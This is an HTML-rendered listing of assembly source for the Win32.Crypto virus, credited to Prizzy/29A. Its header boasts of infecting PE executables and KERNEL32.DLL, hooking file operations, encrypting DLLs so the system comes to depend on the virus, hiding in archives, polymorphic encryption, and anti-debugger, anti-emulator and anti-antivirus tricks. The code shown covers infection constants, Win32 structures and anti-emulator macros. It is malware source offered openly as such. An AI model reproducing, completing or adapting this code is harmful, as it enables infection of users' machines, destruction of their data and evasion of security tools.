<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>crypto.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc7 {
	font-weight: bold;
	color: #0080C0;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  : Prizzy/29A :        Win32.Crypto             : Prizzy/29A :</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   I'm very proud on my very first virus at Win32 platform. It infects EXE</span><span class="sc0">
</span><span class="sc1">;   files with PE (Portable Executable) header. Also it can compress itself</span><span class="sc0">
</span><span class="sc1">;   into ZIP/ARJ/RAR/ACE/CAB archivez. If the virus catch DLL opeations, it</span><span class="sc0">
</span><span class="sc1">;   encrypt/decrypt that by cryptography functions. Thus, we can  pronounce</span><span class="sc0">
</span><span class="sc1">;   the system is dependents on the virus (OneHalf idea).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   When infected EXE is started, it infects KERNEL32.DLL, hooks some Win32</span><span class="sc0">
</span><span class="sc1">;   functions and next reboot is actived. It catches "all" file operations,</span><span class="sc0">
</span><span class="sc1">;   create thread/mutex, run Hyper Infection  for API to find  archivez, AV</span><span class="sc0">
</span><span class="sc1">;   checksum files, EXEs and so on.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   If PHI-API will find an archive program, the virus compress itself  and</span><span class="sc0">
</span><span class="sc1">;   add itself to body (inside, not at the end). My PPE-II does NOT support</span><span class="sc0">
</span><span class="sc1">;   copro &amp; mmx garbages, only based with many features are new.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                Detailed Information</span><span class="sc0">
</span><span class="sc1">;               ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Cryptography Area, based on WinAPI (SR2/NT) functions</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   Let us start. I exploited One Half technics for Win32 world, new method</span><span class="sc0">
</span><span class="sc1">;   in our VX world. You exactly know One Half tries to encode your sectors</span><span class="sc0">
</span><span class="sc1">;   and if you want to read its he decodes ones and so on, you exactly know</span><span class="sc0">
</span><span class="sc1">;   what I think. Well, and because I use kernel32 infection I can hook all</span><span class="sc0">
</span><span class="sc1">;   file functions. Then I decode all DLL files by PHI-II (Hyper Infection)</span><span class="sc0">
</span><span class="sc1">;   and if the system wants to open DLL file I decode one, and so on. Then,</span><span class="sc0">
</span><span class="sc1">;   the Win32 system is dependents on my virus. Naturally, the user can re-</span><span class="sc0">
</span><span class="sc1">;   install Win95/98/NT/2000 but then DLL are in MSOffice, Visual C++, ICQ,</span><span class="sc0">
</span><span class="sc1">;   Outlook, AutoCAD and many many more appz. For comparison:  my Win98 has</span><span class="sc0">
</span><span class="sc1">;   831 DLL files and on my all disks are 5103 DLL files (including Win2k).</span><span class="sc0">
</span><span class="sc1">;   I know this is the perfect way to get all what you want. But I've found</span><span class="sc0">
</span><span class="sc1">;   out I can't hook all Win32 file operations so, true crypto DLL  will be</span><span class="sc0">
</span><span class="sc1">;   inside Ring0/Ring3 world - my future work...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Prizzy Polymorphic Engine (PPE-II new version)</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   I've removed all copro &amp; mmx garbages and I've coded these new stuff:</span><span class="sc0">
</span><span class="sc1">;   * brute-attack algorithm</span><span class="sc0">
</span><span class="sc1">;   * random multi-layer engine</span><span class="sc0">
</span><span class="sc1">;   By "brute-attack" I'm finding right code value by checksum. And because</span><span class="sc0">
</span><span class="sc1">;   I don't know that number, AV neither. This process can take mostly 0.82</span><span class="sc0">
</span><span class="sc1">;   seconds on my P233. For more info find "ppe_brute_init:" in this source</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   In the second case I don't decode by default (up to down) but by random</span><span class="sc0">
</span><span class="sc1">;   multi-layer algorithm. It means  I generate the certain  buffer and  by</span><span class="sc0">
</span><span class="sc1">;   its I decode up or down. Thus I can generate more  then 950  layers and</span><span class="sc0">
</span><span class="sc1">;   typical some 69 layers. Also the  random buffer, behind  poly loop, has</span><span class="sc0">
</span><span class="sc1">;   anti-heuristic protection (gaps) to AV couldn't simulate  that process.</span><span class="sc0">
</span><span class="sc1">;   So, only in my decoding loop are  stored the places where the gaps are.</span><span class="sc0">
</span><span class="sc1">;   Find "ppe_mlayer_generate:" label for many momre information.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Infection ZIP/ARJ/RAR/ACE/CAB archivez, including RAR/ACE EXE-SFX</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   I will find these archive programs and by them I will compress some in-</span><span class="sc0">
</span><span class="sc1">;   fected file by random compression level. Then the dropper is stored in-</span><span class="sc0">
</span><span class="sc1">;   side archive, not at the end. So, I don't need have any CRC algorithms.</span><span class="sc0">
</span><span class="sc1">;   However these operations are very complex, especially ZIP infection but</span><span class="sc0">
</span><span class="sc1">;   it isn't impossible. So, AV cannot check only last file (stored) in ar-</span><span class="sc0">
</span><span class="sc1">;   chive, but inside it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                Main features</span><span class="sc0">
</span><span class="sc1">;               ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   * Platforms:      Windows 95/98, Windows NT/2000 (tested on 2031 build)</span><span class="sc0">
</span><span class="sc1">;   * Residency:      Yes, KERNEL32 way, working on 95/98 and NT/2k systems</span><span class="sc0">
</span><span class="sc1">;   * Non-residency:  Yes, only K32 infection</span><span class="sc0">
</span><span class="sc1">;   * Stealth:        Yes, DLLs working; opening, copying and loading</span><span class="sc0">
</span><span class="sc1">;   * AntiDebugging:  Yes, some stupid debuggers like TD32; routinues for</span><span class="sc0">
</span><span class="sc1">;             disable SoftICE 95/NT.</span><span class="sc0">
</span><span class="sc1">;   * AntiHeuristic:  Yes, threads way and multi-layer anti-heuristic</span><span class="sc0">
</span><span class="sc1">;   * AntiAntivirus:  Yes, deleting checksum files, hacking AVAST database</span><span class="sc0">
</span><span class="sc1">;   * Other anti-*:   Yes, anti-emulator, anti-bait, anti-monitor</span><span class="sc0">
</span><span class="sc1">;   * Fast Infection: Yes/No, infect only 20 EXEs every reboot, but infect</span><span class="sc0">
</span><span class="sc1">;             all types of archivez on all diskz</span><span class="sc0">
</span><span class="sc1">;   * Polymomrphism:  Yes, using based garbages from Win9x.Prizzy, inclu-</span><span class="sc0">
</span><span class="sc1">;             ding brute-force way and random multi-layer way</span><span class="sc0">
</span><span class="sc1">;   * Other features: (a) Use of brute-CRC64 algorithm to find APIs in K32</span><span class="sc0">
</span><span class="sc1">;             (b) Encoding and decoding DLLs in real time</span><span class="sc0">
</span><span class="sc1">;             (c) Memory allocations by "CreateFileMapping" func.</span><span class="sc0">
</span><span class="sc1">;             'cause of sharing among processes</span><span class="sc0">
</span><span class="sc1">;             (d) Use of threads, mutexes &amp; process tricks</span><span class="sc0">
</span><span class="sc1">;             (e) Support of "do not infected" table</span><span class="sc0">
</span><span class="sc1">;             (f) Checking files by natural logarithm</span><span class="sc0">
</span><span class="sc1">;             (g) No optimalization, yeah, I don't lie (read</span><span class="sc0">
</span><span class="sc1">;             "Words from Prizzy" 29A #4 to know why)</span><span class="sc0">
</span><span class="sc1">;             (h) UniCode support</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                  Greetings</span><span class="sc0">
</span><span class="sc1">;                 ÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   And finally my greetz go to:</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;     Darkman        u're really great inet pal, thanx for fun on #virus :)</span><span class="sc0">
</span><span class="sc1">;     Benny      thanx for big help with threads, mutexes... we're wait-</span><span class="sc0">
</span><span class="sc1">;            ing for Darkman's trip here, aren't we :) ?</span><span class="sc0">
</span><span class="sc1">;     GriYo      nah, I'd like to understand your ideas... thanx :) !</span><span class="sc0">
</span><span class="sc1">;     Flush      u've really big anti-* ideas, dude</span><span class="sc0">
</span><span class="sc1">;     MemoryLapse    yeah, K32 infection... go out of efnet to undernet</span><span class="sc0">
</span><span class="sc1">;     LordJulus      you have great vx articles, viruses ...</span><span class="sc0">
</span><span class="sc1">;     Asmodeus       finish that virus and release it; thanx for your trust</span><span class="sc0">
</span><span class="sc1">;     AV companies   just where is my win9x.prizzy description :) ?</span><span class="sc0">
</span><span class="sc1">;     ...and for VirusBuster and Bumblebee</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Contact me</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;     prizzy@coderz.net</span><span class="sc0">
</span><span class="sc1">;     http://prizzy.cjb.net</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   (c)oded by Prizzy/29A, December 1999</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc2">.386p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">Win32API.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">UseFul.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">MZ.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">PE.inc</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ prepare to program start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some equ's needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;DEBUG       equ     YEZ             ;only for debug and 1st start</span><span class="sc0">

</span><span class="sc5">mem_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;size of virus in memory</span><span class="sc0">
</span><span class="sc5">file_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">file_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;size of virus in file</span><span class="sc0">

</span><span class="sc5">infect_minsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">            </span><span class="sc1">;only filez bigger then 4K</span><span class="sc0">
</span><span class="sc5">infect_maxsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">       </span><span class="sc1">;to 100Mb</span><span class="sc0">

</span><span class="sc5">access_ebx</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;access into stack when</span><span class="sc0">
</span><span class="sc5">access_edx</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;will be used pushad</span><span class="sc0">
</span><span class="sc5">access_ecx</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">access_eax</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">search_mem_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc4">*(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_address</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some structurez for virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">dta_struc</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;Win32_FIND_DATA structure</span><span class="sc0">
</span><span class="sc5">dta_fileattr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;for FindFirstFile function</span><span class="sc0">
</span><span class="sc5">dta_time_creation</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_lastaccess</span><span class="sc0"> </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_lastwrite</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filesize_hi</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filesize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_reserved_0</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_reserved_1</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dta_filename_short</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">sysTime_struc</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;used by my Windows API</span><span class="sc0">
</span><span class="sc5">wYear</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">       </span><span class="sc1">;"hyper infection"</span><span class="sc0">
</span><span class="sc5">wMonth</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">wDayOfWeek</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">wDay</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">wHour</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">wMinute</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">wSecond</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">wMilliseconds</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">Process_Information</span><span class="sc0"> </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;CreateProcess: struc #1</span><span class="sc0">
</span><span class="sc5">hProcess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">hThread</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwProcessId</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwThreadId</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">Startup_Info</span><span class="sc0">        </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;CreateProcess: struc #2</span><span class="sc0">
</span><span class="sc5">cb</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">lpReserved</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;this struc has been stolen</span><span class="sc0">
</span><span class="sc5">lpDesktop</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">   </span><span class="sc1">;from "Win32 Help"</span><span class="sc0">
</span><span class="sc5">lpTitle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwX</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwY</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwXSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwYSize</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwXCountChars</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwYCountChars</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwFillAttribute</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwFlags</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">wShowWindow</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">cbReserved2</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">lpReserved2</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">hStdInput</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">hStdOutput</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">hStdError</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">File_Time</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;get/set file time struc</span><span class="sc0">
</span><span class="sc5">dwLowDateTime</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">dwHighDateTime</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000h</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some macroz needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">; search "anti-emulators:" for more information</span><span class="sc0">

</span><span class="sc5">@ANTI_E_START</span><span class="sc0">       </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">start_hack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">finish_hack</span><span class="sc0">
            </span><span class="sc9">WHILE</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">num</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
              </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">start_hack</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> \
                </span><span class="sc4">((</span><span class="sc5">finish_hack</span><span class="sc4">-</span><span class="sc5">start_hack</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">num</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc5">num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">num</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">
        </span><span class="sc5">num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">finish_hack</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start_hack</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">@ANTI_E_FINISH</span><span class="sc0">      </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">start_hack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">finish_hack</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">thread_handle</span><span class="sc0">
            </span><span class="sc9">WHILE</span><span class="sc0">   </span><span class="sc4">(</span><span class="sc5">num</span><span class="sc0"> </span><span class="sc9">NE</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
              </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finish_hack</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                </span><span class="sc4">(</span><span class="sc5">finish_hack</span><span class="sc4">-</span><span class="sc5">start_hack</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc9">mod</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                </span><span class="sc4">((</span><span class="sc5">finish_hack</span><span class="sc4">-</span><span class="sc5">start_hack</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">num</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
              </span><span class="sc5">num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">num</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ddCloseHandle</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">thread_handle</span><span class="sc0">
        </span><span class="sc5">num</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">finish_hack</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">start_hack</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">

